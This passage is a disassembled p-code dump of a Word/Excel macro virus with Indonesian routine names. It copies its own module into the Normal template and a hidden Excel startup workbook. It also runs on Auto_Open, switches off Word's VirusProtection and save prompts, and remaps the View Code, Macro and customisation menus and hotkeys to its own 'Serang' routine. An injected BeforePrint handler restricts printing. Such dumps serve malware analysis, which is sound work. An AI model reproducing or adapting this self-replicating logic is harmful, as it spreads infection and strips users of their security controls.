' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld Asal 
' 	Ld Tujuan 
' 	Ld MacName 
' 	Ld Ver 
' 	Concat 
' 	ArgsLd EIKModul 0x0003 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St KompProject 
' 	EndIf 
' 	EndIf 
' 	EndIf 
' Line #109:
' 	Label Salah 
' Line #110:
' 	ExitFunc 
' Line #111:
' 	Label RemoveKomp 
' Line #112:
' 	Ld Komp 
' 	MemLd New 
' 	Ld Tujuan 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	Ld Tujuan 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Remove 0x0001 
' 	BoS 0x0000 
' 	LitVarSpecial (True)
' 	St KompProject 
' 	BoS 0x0000 
' 	Return 
' Line #113:
' 	EndFunc 
' Line #114:
' 	FuncDefn (Sub ThisDocNT())
' Line #115:
' 	Dim 
' 	VarDefn VBCompNT
' Line #116:
' 	OnError (Resume Next) 
' Line #117:
' 	SetStmt 
' 	LitStr 0x000C "ThisDocument"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set VBCompNT 
' Line #118:
' 	Ld VBCompNT 
' 	MemLd CountOfLines 
' 	LitDI2 0x0000 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	Ld VBCompNT 
' 	MemLd CountOfLines 
' 	Ld VBCompNT 
' 	ArgsMemCall DeleteLines 0x0002 
' 	EndIf 
' Line #119:
' 	EndSub 
' Line #120:
' 	FuncDefn (Function RemoveAll() As Boolean)
' Line #121:
' 	OnError Salah 
' Line #122:
' 	ArgsCall Aplikasi 0x0000 
' Line #123:
' 	StartForVariable 
' 	Ld actWindow 
' 	EndForVariable 
' 	Ld AllActive 
' 	ForEach 
' Line #124:
' 	Ld actWindow 
' 	MemLd New 
' 	Ld fStartUp 
' 	Ld Ver 
' 	Concat 
' 	LitStr 0x0004 ".XLS"
' 	Concat 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St RemoveAll 
' 	EndIf 
' Line #125:
' 	Ld actWindow 
' 	MemLd New 
' 	Ld Active 
' 	MemLd New 
' 	Ne 
' 	IfBlock 
' Line #126:
' 	Ld Active 
' 	Ld actWindow 
' 	LitVarSpecial (True)
' 	ArgsLd KompProject 0x0003 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld actWindow 
' 	MemLd Path 
' 	FnLen 
' 	LitDI2 0x0000 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld actWindow 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' 	EndIf 
' Line #127:
' 	EndIfBlock 
' Line #128:
' 	StartForVariable 
' 	Ld actWindow 
' 	EndForVariable 
' 	NextVar 
' Line #129:
' 	Label Salah 
' Line #130:
' 	EndFunc 
' Line #131:
' 	FuncDefn (Function PrintOke() As Boolean)
' Line #132:
' 	Dim (Const) 
' 	LitStr 0x0004 "cPrt"
' 	VarDefn CP
' Line #133:
' 	OnError Salah 
' Line #134:
' 	Ld KeyWord 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld GetCreator 
' 	LitVarSpecial (True)
' 	Eq 
' 	Or 
' 	IfBlock 
' Line #135:
' 	LitVarSpecial (True)
' 	St PrintOke 
' Line #136:
' 	ElseBlock 
' Line #137:
' 	Ld CP 
' 	Ld CusProp 
' 	ArgsMemLd Item 0x0001 
' 	MemLd Value 
' 	LitDI2 0x0002 
' 	Lt 
' 	IfBlock 
' Line #138:
' 	Ld CP 
' 	Ld CusProp 
' 	ArgsMemLd Item 0x0001 
' 	MemLd Value 
' 	LitDI2 0x0001 
' 	Add 
' 	Ld CP 
' 	Ld CusProp 
' 	ArgsMemLd Item 0x0001 
' 	MemSt Value 
' Line #139:
' 	Ld regApp 
' 	Ld regSecSet 
' 	Ld CP 
' 	ArgsLd GetSetting 0x0003 
' 	ArgsLd Val 0x0001 
' 	LitDI2 0x000F 
' 	Le 
' 	If 
' 	BoSImplicit 
' 	Ld regApp 
' 	Ld regSecSet 
' 	Ld CP 
' 	Ld regApp 
' 	Ld regSecSet 
' 	Ld CP 
' 	ArgsLd GetSetting 0x0003 
' 	ArgsLd Val 0x0001 
' 	LitDI2 0x0001 
' 	Add 
' 	ArgsCall SaveSetting 0x0004 
' 	BoS 0x0000 
' 	LitVarSpecial (True)
' 	St PrintOke 
' 	EndIf 
' Line #140:
' 	EndIfBlock 
' Line #141:
' 	EndIfBlock 
' Line #142:
' 	Label Salah 
' Line #143:
' 	EndFunc 
' Line #144:
' 	FuncDefn (Sub FilePrint())
' Line #145:
' 	OnError (Resume Next) 
' Line #146:
' 	Ld PrintOke 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0058 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' 	Else 
' 	BoSImplicit 
' 	LitDI2 0x0058 
' 	ArgsLd Dialogs 0x0001 
' 	MemLd Display 
' 	LitDI2 0x0001 
' 	UMi 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall Serang 0x0000 
' 	EndIf 
' 	EndIf 
' Line #147:
' 	EndSub 
' Line #148:
' 	FuncDefn (Sub FilePrintDefault())
' Line #149:
' 	ArgsCall FilePrint 0x0000 
' Line #150:
' 	EndSub 
' Line #151:
' 	FuncDefn (Sub ToolsCustomizeKeyboard())
' Line #152:
' 	ArgsCall Serang 0x0000 
' Line #153:
' 	EndSub 
' Line #154:
' 	FuncDefn (Sub ViewCode())
' Line #155:
' 	ArgsCall Serang 0x0000 
' Line #156:
' 	EndSub 
' Line #157:
' 	FuncDefn (Sub ViewVbCode())
' Line #158:
' 	Ld regApp 
' 	Ld regSecSet 
' 	LitStr 0x000D "AuthorKeyWord"
' 	ArgsLd GetSetting 0x0003 
' 	LitStr 0x0003 "Mrs"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt ShowVisualBasicEditor 
' 	Else 
' 	BoSImplicit 
' 	ArgsCall Serang 0x0000 
' 	EndIf 
' Line #159:
' 	EndSub 
' Line #160:
' 	FuncDefn (Sub ToolsCustomize())
' Line #161:
' 	ArgsCall Serang 0x0000 
' Line #162:
' 	EndSub 
' Line #163:
' 	FuncDefn (Sub FormatStyle())
' Line #164:
' 	Ld KeyWord 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x00B4 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' 	Else 
' 	BoSImplicit 
' 	ArgsCall Serang 0x0000 
' 	EndIf 
' Line #165:
' 	EndSub 
' Line #166:
' 	FuncDefn (Sub ToolsRecordMacroToggle())
' Line #167:
' 	ArgsCall Serang 0x0000 
' Line #168:
' 	EndSub 
' Line #169:
' 	FuncDefn (Sub ToolsMacro())
' Line #170:
' 	ArgsCall Serang 0x0000 
' Line #171:
' 	EndSub 
' Line #172:
' 	FuncDefn (Sub FileTemplates())
' Line #173:
' 	ArgsCall Serang 0x0000 
' Line #174:
' 	EndSub 
' Line #175:
' 	FuncDefn (Private Sub ExportXls())
' Line #176:
' 	Dim 
' 	VarDefn xlsApp
' Line #177:
' 	Dim 
' 	VarDefn strFile (As String)
' Line #178:
' 	OnError (Resume Next) 
' Line #179:
' 	SetStmt 
' 	ParamOmitted 
' 	LitStr 0x0011 "Excel.Application"
' 	ArgsLd GetObject 0x0002 
' 	Set xlsApp 
' Line #180:
' 	Ld xlsApp 
' 	LitNothing 
' 	Is 
' 	IfBlock 
' Line #181:
' 	SetStmt 
' 	LitStr 0x0011 "Excel.Application"
' 	ArgsLd CreateObject 0x0001 
' 	Set xlsApp 
' Line #182:
' 	Ld xlsApp 
' 	LitNothing 
' 	Is 
' 	Not 
' 	If 
' 	BoSImplicit 
' 	GoSub CheckXls 
' 	BoS 0x0034 
' 	Ld xlsApp 
' 	MemLd Application 
' 	ArgsMemCall Quit 0x0000 
' 	EndIf 
' Line #183:
' 	ElseBlock 
' Line #184:
' 	GoSub CheckXls 
' Line #185:
' 	EndIfBlock 
' Line #186:
' 	ExitSub 
' Line #187:
' 	Label CheckXls 
' Line #188:
' 	Ld xlsApp 
' 	MemLd StartupPath 
' 	Ld xlsApp 
' 	MemLd PathSeparator 
' 	Concat 
' 	ArgsCall RemStartUp 0x0001 
' Line #189:
' 	Ld blnXls 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #190:
' 	Ld xlsApp 
' 	MemLd Workbooks 
' 	ArgsMemCall Add 0x0000 
' Line #191:
' 	Ld xlsApp 
' 	MemLd StartupPath 
' 	Ld xlsApp 
' 	MemLd PathSeparator 
' 	Concat 
' 	Ld fStartUp 
' 	Concat 
' 	Ld Ver 
' 	Concat 
' 	LitStr 0x0004 ".XLS"
' 	Concat 
' 	St strFile 
' Line #192:
' 	Ld strFile 
' 	Ld xlsApp 
' 	MemLd ActiveWorkbook 
' 	ArgsMemCall SaveAs 0x0001 
' Line #193:
' 	Ld Application 
' 	MemLd NormalTemplate 
' 	MemLd Path 
' 	Ld Application 
' 	MemLd PathSeparator 
' 	Concat 
' 	St tempPath 
' Line #194:
' 	Ld NormalTemplate 
' 	Ld fStartUp 
' 	Ld Ver 
' 	Concat 
' 	LitStr 0x0004 ".XLS"
' 	Concat 
' 	Ld xlsApp 
' 	ArgsMemLd Workbooks 0x0001 
' 	Ld MacName 
' 	Ld Ver 
' 	Concat 
' 	ArgsCall EIKModul 0x0003 
' Line #195:
' 	Ld TempName 
' 	Ld Ver 
' 	Concat 
' 	Ld fStartUp 
' 	Ld Ver 
' 	Concat 
' 	LitStr 0x0004 ".XLS"
' 	Concat 
' 	Ld xlsApp 
' 	ArgsMemLd Workbooks 0x0001 
' 	MemLd VBProject 
' 	MemSt New 
' Line #196:
' 	LitVarSpecial (False)
' 	Ld xlsApp 
' 	MemLd ActiveWindow 
' 	MemSt Visible 
' Line #197:
' 	Ld fStartUp 
' 	Ld Ver 
' 	Concat 
' 	LitStr 0x0004 ".XLS"
' 	Concat 
' 	Ld xlsApp 
' 	ArgsMemLd Workbooks 0x0001 
' 	ArgsMemCall Save 0x0000 
' Line #198:
' 	EndIfBlock 
' Line #199:
' 	Return 
' Line #200:
' 	EndSub 
' Line #201:
' 	FuncDefn (Sub ExportDok())
' Line #202:
' 	Dim 
' 	VarDefn dokApp
' Line #203:
' 	OnError (Resume Next) 
' Line #204:
' 	SetStmt 
' 	ParamOmitted 
' 	LitStr 0x0010 "Word.Application"
' 	ArgsLd GetObject 0x0002 
' 	Set dokApp 
' Line #205:
' 	Ld dokApp 
' 	LitNothing 
' 	Is 
' 	IfBlock 
' Line #206:
' 	SetStmt 
' 	LitStr 0x0010 "Word.Application"
' 	ArgsLd CreateObject 0x0001 
' 	Set dokApp 
' Line #207:
' 	Ld dokApp 
' 	LitNothing 
' 	Is 
' 	Not 
' 	If 
' 	BoSImplicit 
' 	GoSub CheckDoc 
' 	BoS 0x0000 
' 	LitVarSpecial (True)
' 	Ld dokApp 
' 	MemLd Application 
' 	ArgsMemCall Quit 0x0001 
' 	EndIf 
' Line #208:
' 	ElseBlock 
' Line #209:
' 	GoSub CheckDoc 
' Line #210:
' 	EndIfBlock 
' Line #211:
' 	ExitSub 
' Line #212:
' 	Label CheckDoc 
' Line #213:
' 	Ld Application 
' 	MemLd TemplatesPath 
' 	St tempPath 
' Line #214:
' 	Ld fStartUp 
' 	Ld Ver 
' 	Concat 
' 	LitStr 0x0004 ".XLS"
' 	Concat 
' 	ArgsLd Workbooks 0x0001 
' 	Ld dokApp 
' 	MemLd NormalTemplate 
' 	LitVarSpecial (True)
' 	ArgsCall KompProject 0x0003 
' Line #215:
' 	Ld dokApp 
' 	MemLd StartupPath 
' 	Ld dokApp 
' 	MemLd PathSeparator 
' 	Concat 
' 	ArgsCall RemStartUp 0x0001 
' Line #216:
' 	Return 
' Line #217:
' 	EndSub 
' Line #218:
' 	FuncDefn (Sub Auto_Open())
' Line #219:
' 	OnError (Resume Next) 
' Line #220:
' 	LitDI2 0x0000 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #221:
' 	Ld RemoveAll 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall BuatXlsActive 0x0000 
' 	EndIf 
' Line #222:
' 	Ld Application 
' 	MemLd StartupPath 
' 	Ld Application 
' 	MemLd PathSeparator 
' 	Concat 
' 	ArgsCall RemStartUp 0x0001 
' Line #223:
' 	ArgsCall XlsActive 0x0000 
' Line #224:
' 	Ld ActiveWorkbook 
' 	MemLd New 
' 	Ld fStartUp 
' 	Ld Ver 
' 	Concat 
' 	LitStr 0x0004 ".XLS"
' 	Concat 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall ExportDok 0x0000 
' 	EndIf 
' Line #225:
' 	ArgsCall Register 0x0000 
' Line #226:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt DisplayRecentFiles 
' Line #227:
' 	EndSub 
' Line #228:
' 	FuncDefn (Sub XlsActive())
' Line #229:
' 	OnError (Resume Next) 
' Line #230:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #231:
' 	ArgsCall CreateEvents 0x0000 
' Line #232:
' 	ArgsCall TempActive 0x0000 
' Line #233:
' 	LitStr 0x0000 ""
' 	Ld Application 
' 	MemSt OnSheetActivate 
' 	BoS 0x0000 
' 	LitStr 0x0000 ""
' 	Ld Application 
' 	MemSt OnSheetDeactivate 
' 	BoS 0x0000 
' 	LitStr 0x0000 ""
' 	Ld Application 
' 	MemSt OnWindow 
' Line #234:
' 	ArgsCall MenuExcel 0x0000 
' Line #235:
' 	Ld fStartUp 
' 	Ld Ver 
' 	Concat 
' 	LitStr 0x0004 ".XLS"
' 	Concat 
' 	LitStr 0x000A "!XlsActive"
' 	Concat 
' 	Ld Application 
' 	MemSt OnWindow 
' Line #236:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #237:
' 	EndSub 
' Line #238:
' 	FuncDefn (Sub TempActive())
' Line #239:
' 	OnError (Resume Next) 
' Line #240:
' 	ArgsCall Aplikasi 0x0000 
' Line #241:
' 	Ld Temp 
' 	Ld Active 
' 	LitVarSpecial (True)
' 	ArgsLd KompProject 0x0003 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #242:
' 	ArgsCall SetCusProp 0x0000 
' Line #243:
' 	Ld MacName 
' 	Ld Active 
' 	MemLd VBProject 
' 	MemSt New 
' Line #244:
' 	Ld Active 
' 	MemLd Path 
' 	FnLen 
' 	LitDI2 0x0000 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld Active 
' 	ArgsMemCall Save 0x0000 
' 	EndIf 
' Line #245:
' 	EndIfBlock 
' Line #246:
' 	EndSub 
' Line #247:
' 	FuncDefn (Function EIKModul(Asal, Tujuan, Komp As String) As Boolean)
' Line #248:
' 	OnError Salah 
' Line #249:
' 	Ld tempPath 
' 	Ld Komp 
' 	Concat 
' 	Ld Komp 
' 	Ld Asal 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #250:
' 	Ld tempPath 
' 	Ld Komp 
' 	Concat 
' 	Ld Tujuan 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #251:
' 	LitVarSpecial (True)
' 	St EIKModul 
' 	BoS 0x0000 
' 	Ld tempPath 
' 	Ld Komp 
' 	Concat 
' 	ArgsCall Kill 0x0001 
' Line #252:
' 	Label Salah 
' Line #253:
' 	EndFunc 
' Line #254:
' 	FuncDefn (Sub OpenFile())
' Line #255:
' 	OnError (Resume Next) 
' Line #256:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #257:
' 	LitDI2 0x0001 
' 	Ld Application 
' 	ArgsMemLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #258:
' 	ArgsCall XlsActive 0x0000 
' Line #259:
' 	EndSub 
' Line #260:
' 	FuncDefn (Private Sub CreateEvents())
' Line #261:
' 	Dim 
' 	VarDefn VBComp
' Line #262:
' 	OnError Salah 
' Line #263:
' 	Label Lanjut 
' Line #264:
' 	LitStr 0x0005 "Event"
' 	Ld ActiveWorkbook 
' 	MemLd CustomDocumentProperties 
' 	ArgsMemLd Item 0x0001 
' 	MemLd Value 
' 	Ld MacName 
' 	Ld Ver 
' 	Concat 
' 	Ne 
' 	Ld ActiveWorkbook 
' 	MemLd New 
' 	Ld fStartUp 
' 	Ld Ver 
' 	Concat 
' 	LitStr 0x0004 ".XLS"
' 	Concat 
' 	Ne 
' 	And 
' 	IfBlock 
' Line #265:
' 	OnError FatalError 
' Line #266:
' 	SetStmt 
' 	LitStr 0x000C "ThisWorkbook"
' 	Ld ActiveWorkbook 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set VBComp 
' Line #267:
' 	StartWithExpr 
' 	Ld VBComp 
' 	With 
' Line #268:
' 	LitDI2 0x0001 
' 	MemLdWith CountOfLines 
' 	ArgsMemCallWith DeleteLines 0x0002 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	LitStr 0x0033 "Private Sub Workbook_BeforePrint(Cancel As Boolean)"
' 	ArgsMemCallWith InsertLines 0x0002 
' Line #269:
' 	LitDI2 0x0002 
' 	LitStr 0x0014 "On Error Resume Next"
' 	ArgsMemCallWith InsertLines 0x0002 
' 	BoS 0x0000 
' 	LitDI2 0x0003 
' 	LitStr 0x0026 "If PrintOke = False Then Cancel = True"
' 	ArgsMemCallWith InsertLines 0x0002 
' 	BoS 0x0000 
' 	LitDI2 0x0004 
' 	LitStr 0x0007 "End Sub"
' 	ArgsMemCallWith InsertLines 0x0002 
' Line #270:
' 	EndWith 
' Line #271:
' 	Ld MacName 
' 	Ld Ver 
' 	Concat 
' 	LitStr 0x0005 "Event"
' 	Ld ActiveWorkbook 
' 	MemLd CustomDocumentProperties 
' 	ArgsMemLd Item 0x0001 
' 	MemSt Value 
' Line #272:
' 	EndIfBlock 
' Line #273:
' 	Label FatalError 
' Line #274:
' 	ExitSub 
' Line #275:
' 	Label Salah 
' Line #276:
' 	LitStr 0x0005 "Event"
' 	Paren 
' 	LitVarSpecial (False)
' 	LitDI2 0x0004 
' 	LitStr 0x0000 ""
' 	Ld ActiveWorkbook 
' 	MemLd CustomDocumentProperties 
' 	ArgsMemCall Add 0x0004 
' Line #277:
' 	Resume Lanjut 
' Line #278:
' 	EndSub 
' Line #279:
' 	FuncDefn (Sub BuatXlsActive())
' Line #280:
' 	Dim 
' 	VarDefn Baru (As String)
' Line #281:
' 	OnError (Resume Next) 
' Line #282:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #283:
' 	Ld Workbooks 
' 	ArgsMemCall Add 0x0000 
' Line #284:
' 	Ld Application 
' 	MemLd StartupPath 
' 	Ld Application 
' 	MemLd PathSeparator 
' 	Concat 
' 	Ld fStartUp 
' 	Concat 
' 	Ld Ver 
' 	Concat 
' 	LitStr 0x0004 ".XLS"
' 	Concat 
' 	St Baru 
' Line #285:
' 	Ld Baru 
' 	Ld ActiveWorkbook 
' 	ArgsMemCall SaveAs 0x0001 
' Line #286:
' 	LitVarSpecial (False)
' 	Ld ActiveWindow 
' 	MemSt Visible 
' Line #287:
' 	ArgsCall ActiveTemp 0x0000 
' Line #288:
' 	EndSub 
' Line #289:
' 	FuncDefn (Sub ActiveTemp())
' Line #290:
' 	OnError (Resume Next) 
' Line #291:
' 	ArgsCall Aplikasi 0x0000 
' Line #292:
' 	Ld Active 
' 	Ld Temp 
' 	LitVarSpecial (True)
' 	ArgsLd KompProject 0x0003 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #293:
' 	Ld TempName 
' 	Ld Ver 
' 	Concat 
' 	Ld Temp 
' 	MemLd VBProject 
' 	MemSt New 
' Line #294:
' 	Ld Temp 
' 	ArgsMemCall Save 0x0000 
' Line #295:
' 	LitVarSpecial (True)
' 	St blnFound 
' Line #296:
' 	EndIfBlock 
' Line #297:
' 	EndSub 
' Line #298:
' 	FuncDefn (Sub MenuExcel())
' Line #299:
' 	OnError (Resume Next) 
' Line #300:
' 	ArgsCall WordExcel 0x0000 
' Line #301:
' 	LitStr 0x0009 "View Code"
' 	LitStr 0x0003 "Ply"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemCall Delete 0x0000 
' Line #302:
' 	StartWithExpr 
' 	Ld Application 
' 	With 
' Line #303:
' 	LitStr 0x0006 "%{F11}"
' 	LitStr 0x0006 "Serang"
' 	ArgsMemCallWith OnKey 0x0002 
' 	BoS 0x0000 
' 	LitStr 0x0005 "%{F8}"
' 	LitStr 0x0006 "Serang"
' 	ArgsMemCallWith OnKey 0x0002 
' 	BoS 0x0000 
' 	LitStr 0x0005 "%{F2}"
' 	LitStr 0x0006 "Serang"
' 	ArgsMemCallWith OnKey 0x0002 
' Line #304:
' 	LitStr 0x0005 "%{F4}"
' 	LitStr 0x0006 "Serang"
' 	ArgsMemCallWith OnKey 0x0002 
' 	BoS 0x0000 
' 	LitStr 0x0005 "{F12}"
' 	LitStr 0x0006 "Serang"
' 	ArgsMemCallWith OnKey 0x0002 
' 	BoS 0x0000 
' 	LitStr 0x0004 "^{o}"
' 	LitStr 0x0008 "OpenFile"
' 	ArgsMemCallWith OnKey 0x0002 
' Line #305:
' 	EndWith 
' Line #306:
' 	LitStr 0x0008 "OpenFile"
' 	LitStr 0x0004 "Open"
' 	LitStr 0x0008 "Standard"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt OnAction 
' Line #307:
' 	LitStr 0x0008 "OpenFile"
' 	LitStr 0x0007 "Open..."
' 	LitStr 0x0004 "File"
' 	LitStr 0x0012 "Worksheet Menu Bar"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt OnAction 
' Line #308:
' 	LitVarSpecial (False)
' 	LitStr 0x0009 "Unhide..."
' 	LitStr 0x0006 "Window"
' 	LitStr 0x0012 "Worksheet Menu Bar"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #309:
' 	EndSub 
' Line #310:
' 	FuncDefn (Sub WordExcel())
' Line #311:
' 	OnError (Resume Next) 
' Line #312:
' 	StartForVariable 
' 	Ld ctl 
' 	EndForVariable 
' 	LitStr 0x0005 "Macro"
' 	LitStr 0x0005 "Tools"
' 	Ld CommandBars 
' 	MemLd ActiveMenuBar 
' 	ArgsMemLd Controls 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemLd Controls 
' 	ForEach 
' Line #313:
' 	LitStr 0x0006 "Serang"
' 	Ld ctl 
' 	MemSt OnAction 
' Line #314:
' 	StartForVariable 
' 	Ld ctl 
' 	EndForVariable 
' 	NextVar 
' Line #315:
' 	LitStr 0x000F "Control Toolbox"
' 	ArgsLd CommandBars 0x0001 
' 	LitVarSpecial (True)
' 	ArgsCall cmdBars 0x0002 
' 	BoS 0x0000 
' 	LitStr 0x0005 "Forms"
' 	ArgsLd CommandBars 0x0001 
' 	LitVarSpecial (True)
' 	ArgsCall cmdBars 0x0002 
' 	BoS 0x0000 
' 	LitStr 0x000F "ActiveX Control"
' 	ArgsLd CommandBars 0x0001 
' 	LitVarSpecial (True)
' 	ArgsCall cmdBars 0x0002 
' Line #316:
' 	LitStr 0x000C "Visual Basic"
' 	ArgsLd CommandBars 0x0001 
' 	LitVarSpecial (True)
' 	ArgsCall cmdBars 0x0002 
' 	BoS 0x0000 
' 	Ld CommandBars 
' 	MemLd ActiveMenuBar 
' 	LitVarSpecial (False)
' 	ArgsCall cmdBars 0x0002 
' 	BoS 0x0000 
' 	LitStr 0x000A "Formatting"
' 	ArgsLd CommandBars 0x0001 
' 	LitVarSpecial (False)
' 	ArgsCall cmdBars 0x0002 
' Line #317:
' 	LitStr 0x0008 "Standard"
' 	ArgsLd CommandBars 0x0001 
' 	LitVarSpecial (False)
' 	ArgsCall cmdBars 0x0002 
' Line #318:
' 	EndSub 
' Line #319:
' 	FuncDefn (Sub cmdBars(cmd, blnVis As Boolean))
' Line #320:
' 	StartWithExpr 
' 	Ld cmd 
' 	With 
' Line #321:
' 	Ld blnVis 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (False)
' 	MemStWith Enabled 
' 	BoS 0x0000 
' 	LitVarSpecial (False)
' 	MemStWith Visible 
' 	BoS 0x0000 
' 	LitDI2 0x0008 
' 	MemStWith Protection 
' 	EndIf 
' Line #322:
' 	LitDI2 0x0001 
' 	MemStWith Protection 
' Line #323:
' 	EndWith 
' Line #324:
' 	EndSub 
' Line #325:
' 	FuncDefn (Sub MenuWord())
' Line #326:
' 	OnError (Resume Next) 
' Line #327:
' 	Ld NormalTemplate 
' 	St CustomizationContext 
' Line #328:
' 	StartWithExpr 
' 	Ld Options 
' 	With 
' Line #329:
' 	LitVarSpecial (False)
' 	MemStWith VirusProtection 
' 	BoS 0x0000 
' 	LitVarSpecial (False)
' 	MemStWith SaveNormalPrompt 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	MemStWith SaveInterval 
' Line #330:
' 	EndWith 
' Line #331:
' 	LitDI2 0x0400 
' 	LitDI2 0x0077 
' 	ArgsLd BuildKeyCode 0x0002 
' 	ArgsLd FindKey 0x0001 
' 	ArgsMemCall Disable 0x0000 
' 	BoS 0x0000 
' 	LitDI2 0x0400 
' 	LitDI2 0x0070 
' 	ArgsLd BuildKeyCode 0x0002 
' 	ArgsLd FindKey 0x0001 
' 	ArgsMemCall Disable 0x0000 
' Line #332:
' 	ArgsCall WordExcel 0x0000 
' Line #333:
' 	EndSub 
' Line #334:
' 	FuncDefn (Sub SetCusProp())
' Line #335:
' 	OnError (Resume Next) 
' Line #336:
' 	SetStmt 
' 	Ld Active 
' 	MemLd CustomDocumentProperties 
' 	Set CusProp 
' Line #337:
' 	LitStr 0x0006 "Author"
' 	LitVarSpecial (False)
' 	LitDI2 0x0004 
' 	LitStr 0x0000 ""
' 	Ld CusProp 
' 	ArgsMemCall Add 0x0004 
' 	BoS 0x0000 
' 	LitStr 0x0004 "cPrt"
' 	LitVarSpecial (False)
' 	LitDI2 0x0001 
' 	LitDI2 0x0000 
' 	Ld CusProp 
' 	ArgsMemCall Add 0x0004 
' Line #338:
' 	Ld regApp 
' 	Ld regSecSet 
' 	LitStr 0x000D "AuthorKeyWord"
' 	ArgsLd GetSetting 0x0003 
' 	LitStr 0x0006 "Marsel"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0004 "Lina"
' 	LitStr 0x0006 "Author"
' 	Ld CusProp 
' 	ArgsMemLd Item 0x0001 
' 	MemSt Value 
' 	EndIf 
' Line #339:
' 	EndSub 
' Line #340:
' 	FuncDefn (Function GetCreator() As Boolean)
' Line #341:
' 	OnError Salah 
' Line #342:
' 	ArgsCall Aplikasi 0x0000 
' Line #343:
' 	SetStmt 
' 	Ld Active 
' 	MemLd CustomDocumentProperties 
' 	Set CusProp 
' Line #344:
' 	LitStr 0x0006 "Author"
' 	Ld CusProp 
' 	ArgsMemLd Item 0x0001 
' 	MemLd Value 
' 	LitStr 0x0004 "Lina"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St GetCreator 
' 	EndIf 
' Line #345:
' 	Label Salah 
' Line #346:
' 	EndFunc 
' Line #347:
' 	FuncDefn (Sub FoundIt())
' Line #348:
' 	ArgsCall TempActive 0x0000 
' Line #349:
' 	LitVarSpecial (False)
' 	St blnFound 
' Line #350:
' 	EndSub 
' Line #351:
' 	FuncDefn (Function Tator() As Boolean)
' Line #352:
' 	Ld KeyWord 
' 	LitVarSpecial (False)
' 	Eq 
' 	Paren 
' 	Ld GetCreator 
' 	LitVarSpecial (False)
' 	Eq 
' 	Paren 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St Tator 
' 	EndIf 
' Line #353:
' 	EndFunc 
' Line #354:
' 	FuncDefn (Sub Aplikasi())
' Line #355:
' 	Ld Application 
' 	MemLd New 
' 	LitStr 0x000E "Microsoft Word"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall Doc 0x0000 
' 	Else 
' 	BoSImplicit 
' 	ArgsCall Xls 0x0000 
' 	EndIf 
' Line #356:
' 	EndSub 
' Line #357:
' 	FuncDefn (Sub Doc())
' Line #358:
' 	ArgsCall ThisDocNT 0x0000 
' Line #359:
' 	ArgsCall CreateThisDocAD 0x0000 
' Line #360:
' 	Ld Application 
' 	MemLd NormalTemplate 
' 	MemLd Path 
' 	Ld Application 
' 	MemLd PathSeparator 
' 	Concat 
' 	St tempPath 
' 	BoS 0x0000 
' 	SetStmt 
' 	Ld ActiveDocument 
' 	Set Active 
' 	BoS 0x0000 
' 	SetStmt 
' 	Ld NormalTemplate 
' 	Set Temp 
' 	BoS 0x0000 
' 	SetStmt 
' 	Ld Documents 
' 	Set AllActive 
' Line #361:
' 	EndSub 
